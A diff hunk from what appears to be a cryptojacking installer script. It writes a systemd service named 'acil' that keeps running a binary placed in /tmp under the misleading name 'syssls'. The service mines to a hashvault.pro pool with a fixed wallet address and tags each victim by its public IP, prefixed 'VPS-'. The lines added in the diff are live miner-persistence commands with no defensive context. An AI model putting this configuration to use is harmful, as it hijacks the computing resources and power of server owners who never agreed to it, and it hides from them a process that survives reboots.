@@ -29,7 +29,7 @@ After=network.target
 Type=simple
 Restart=on-failure
 RestartSec=15s
-ExecStart=/tmp/syssls --opencl --cuda --url pool.hashvault.pro:443 --user 86fz79VrJTCZ4J1jLFfwzvdFehcQaHaTZj8uY23Po4R1Bfj2JhtuaDYetJZC7qZekm4aLvi1pZbhLW2zEJ7CvwXoB8DoncY --pass $IP_PUBLIC_REPLACED --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
+ExecStart=/tmp/syssls --opencl --cuda --url pool.hashvault.pro:443 --user 86fz79VrJTCZ4J1jLFfwzvdFehcQaHaTZj8uY23Po4R1Bfj2JhtuaDYetJZC7qZekm4aLvi1pZbhLW2zEJ7CvwXoB8DoncY --pass VPS-$IP_PUBLIC_REPLACED --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
 
 [Install]
 WantedBy=multi-user.target" > /etc/systemd/system/acil.service
